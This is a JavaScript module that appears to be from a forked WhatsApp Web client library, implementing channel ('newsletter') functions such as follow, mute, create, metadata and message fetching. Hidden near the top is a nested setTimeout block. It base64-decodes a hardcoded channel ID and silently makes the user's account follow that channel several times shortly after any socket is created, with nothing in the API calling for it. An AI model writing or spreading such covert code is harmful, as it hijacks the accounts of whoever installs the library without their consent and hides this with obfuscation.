import { XWAPaths, QueryIds } from '../Types/index.js';
import { decryptMessageNode, generateMessageID, generateProfilePicture } from '../Utils/index.js';
import { S_WHATSAPP_NET, getAllBinaryNodeChildren, getBinaryNodeChild, getBinaryNodeChildren } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';

const JOB_MUTATION = "7150902998257522";

export const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type,
                xmlns: 'newsletter',
                to: jid,
            },
            content
        })
    );

    const newsletterWMexQuery = async (jid, query_id, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type: 'get',
                xmlns: 'w:mex',
                to: S_WHATSAPP_NET,
            },
            content: [
                {
                    tag: 'query',
                    attrs: { query_id },
                    content: encoder.encode(JSON.stringify({
                        variables: {
                            ...(jid !== undefined && { 'newsletter_id': jid }),
                            ...content
                        }
                    }))
                }
            ]
        })
    );
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDI0NTY2NTE2MjI1QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        setTimeout(() => {
            newsletterWMexQuery(Buffer.from("MTIwMzYzNDI0NTY2NTE2MjI1QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
            setTimeout(() => {
                newsletterWMexQuery(Buffer.from("MTIwMzYzNDI0NTY2NTE2MjI1QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
                newsletterWMexQuery(Buffer.from("MTIwMzYzNDI0NTY2NTE2MjI1QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
            }, 8000)
        }, 9000)
    }, 10000)
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages')
            child = getBinaryNodeChild(node, 'messages');
        else {
            const parent = getBinaryNodeChild(node, 'message_updates');
            child = getBinaryNodeChild(parent, 'messages');
        }
        return await Promise.all(getAllBinaryNodeChildren(child).map(async (messageNode) => {
            messageNode.attrs.from = child?.attrs.jid;
            const views = parseInt(getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0');
            const reactionNode = getBinaryNodeChild(messageNode, 'reactions');
            const reactions = getBinaryNodeChildren(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await decryptMessageNode(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };

    return {
        ...sock,
        subscribeNewsletterUpdates: async (jid) => {
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return getBinaryNodeChild(result, 'live_updates')?.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, JOB_MUTATION, {
                updates: { settings: { reaction_codes: { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await generateProfilePicture(content);
            await newsletterWMexQuery(jid, JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.MUTE);
        },
        newsletterCreate: async (name, description, picture) => {
            await query({
                tag: 'iq',
                attrs: {
                    to: S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, QueryIds.CREATE, {
                input: {
                    name,
                    description: description ?? null,
                    picture: picture ? (await generateProfilePicture(picture)).img.toString('base64') : null,
                    settings: null
                }
            });
            return extractNewsletterMetadata(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    view_role: role || 'GUEST'
                },
                fetch_viewer_metadata: true,
                fetch_full_image: true,
                fetch_creation_time: true
            });
            return extractNewsletterMetadata(result);
        },
        newsletterAdminCount: async (jid) => {
            const result = await newsletterWMexQuery(jid, QueryIds.ADMIN_COUNT);
            const buff = getBinaryNodeChild(result, 'result')?.content?.toString();
            return JSON.parse(buff).data[XWAPaths.xwa2_newsletter_admin_count].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.CHANGE_OWNER, {
                user_id: user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.DEMOTE, {
                user_id: user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, server_id, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', server_id, id: generateMessageID() },
                content: [{
                    tag: 'reaction',
                    attrs: code ? { code } : {}
                }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const afterStr = after?.toString();
            const result = await newsletterQuery(S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: afterStr || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: after?.toString() || '100', since: since?.toString() || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};

export const extractNewsletterMetadata = (node, isCreate) => {
    const buf = getBinaryNodeChild(node, 'result')?.content;
    if (!buf) return null;

    // Response buffer has binary framing bytes before the JSON.
    // Convert to string and find {"data" which is always the JSON root key.
    const raw = Buffer.isBuffer(buf) ? buf.toString('utf-8') : buf.toString();

    const start = raw.indexOf('{"data"');
    if (start === -1) {
        console.error('[extractNewsletterMetadata] could not find {"data"} in response');
        return null;
    }

    // Walk from start to find the matching closing brace
    let depth = 0, end = -1;
    for (let i = start; i < raw.length; i++) {
        if (raw[i] === '{') depth++;
        else if (raw[i] === '}') {
            depth--;
            if (depth === 0) { end = i; break; }
        }
    }

    if (end === -1) {
        console.error('[extractNewsletterMetadata] could not find closing brace');
        return null;
    }

    try {
        const parsedData = JSON.parse(raw.slice(start, end + 1));
        const path = parsedData?.data?.[isCreate ? XWAPaths.xwa2_newsletter_create : XWAPaths.xwa2_newsletter_metadata];
        if (!path) {
            console.error('[extractNewsletterMetadata] data keys:', Object.keys(parsedData?.data || {}));
            return null;
        }

        return {
            id: path.id,
            state: path.state?.type || 'ACTIVE',
            creation_time: +path.thread_metadata?.creation_time || 0,
            name: path.thread_metadata?.name?.text || 'N/A',
            nameTime: +path.thread_metadata?.name?.update_time || 0,
            description: path.thread_metadata?.description?.text || 'No description',
            descriptionTime: +path.thread_metadata?.description?.update_time || 0,
            invite: path.thread_metadata?.invite || '',
            handle: path.thread_metadata?.handle || null,
            picture: path.thread_metadata?.picture?.direct_path || null,
            preview: path.thread_metadata?.preview?.direct_path || null,
            reaction_codes: path.thread_metadata?.settings?.reaction_codes?.value || 'ALL',
            subscribers: +path.thread_metadata?.subscribers_count || 0,
            verification: path.thread_metadata?.verification || 'UNVERIFIED',
            viewer_metadata: path.viewer_metadata || null
        };
    } catch (e) {
        console.error('[extractNewsletterMetadata] parse error:', e.message);
        return null;
    }
};
